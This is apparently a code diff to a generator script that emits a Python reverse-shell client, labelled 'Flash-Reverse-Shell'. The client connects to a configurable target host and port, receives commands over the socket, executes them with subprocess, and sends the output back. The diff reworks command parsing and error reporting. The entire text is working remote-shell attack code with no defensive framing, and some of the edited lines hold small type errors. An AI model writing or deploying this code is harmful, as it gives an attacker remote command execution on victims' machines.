@@ -12,9 +12,8 @@ import socket
 # Import subprocess Module to execute commands on a Windows/Linux/OS X
 import subprocess
 
-target_host = """ + target_host + """
+target_host = '""" + target_host + """'
 target_port = """ + target_port + """
-print('-----------------------Flash-Reverse-Shell-----------------------')
 
 # Building a TCP Object
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -26,17 +25,26 @@ print('-----------------------RESPONSE-----------------------')
 
 while True:
     try:
-    response = client.recv(4096)
-    command = response.decode('UTF-8')
-    command_parts = command.split(" ")
-    try:
-        output = subprocess.check_output(command_parts).decode()
-        client.sendall(output.encode('UTF-8'))
-    except subprocess.CalledProcessError as error:
-        print('Following Error was raised: ' + str(error))
+        response = client.recv(4096)
+        command = response.decode('UTF-8')
+        command_parts = []
+        if " " in command:
+            command_parts = command.split(" ")
+        else:
+            command_parts = command
+            
+        try:
+            process = subprocess.Popen(command_parts, stdout=subprocess.PIPE)
+            stdout, stderr = process.communicate()
+            stdout = stdout.decode()
+            client.sendall(stdout.encode('UTF-8'))
+            #output = subprocess.check_output(command_parts).decode()
+            #client.sendall(output.encode('UTF-8'))
+        except subprocess.CalledProcessError as error:
+            client.sendall('Error: '+str(error).encode('UTF-8'))
 
     except KeyboardInterrupt:
-    print('Program forcefully stopped.')
+        client.sendall('RS stopped. Client has closed program.')
     except FileNotFoundError:
-    print('Unknown Command...')
+        client.sendall('Unknown Command...')
                 """)
